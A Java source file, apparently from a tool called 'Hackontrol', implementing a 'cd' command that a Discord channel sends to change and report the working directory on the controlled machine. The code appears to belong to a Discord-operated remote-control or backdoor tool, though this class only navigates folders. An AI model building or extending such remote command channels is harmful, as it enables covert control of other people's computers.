package com.khopan.hackontrol.module.command;

import java.io.File;

import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;

public class ChangeDirectoryCommand {
	private ChangeDirectoryCommand() {}

	public static boolean test(String command) {
		return (command.length() == 2 && command.startsWith("cd")) || command.startsWith("cd ");
	}

	public static void execute(MessageChannel channel, String command) {
		if(command.length() == 2) {
			String directory = CommandModule.CurrentDirectory == null ? "SYSTEMROOT" : CommandModule.CurrentDirectory.getAbsolutePath();
			channel.sendMessage('`' + directory + '`').queue();
			return;
		}

		command = command.substring(3).trim();

		if(command.isEmpty()) {
			channel.sendMessage("`Command input is empty`").queue();
			return;
		}

		File file = new File(command);

		if(!file.exists()) {
			channel.sendMessage("`The system cannot find the path specified.`").queue();
			return;
		}

		if(!file.isDirectory()) {
			channel.sendMessage("`The directory name is invalid.`").queue();
			return;
		}

		CommandModule.CurrentDirectory = file;
		channel.sendMessage('`' + file.getAbsolutePath() + '`').queue();
	}
}
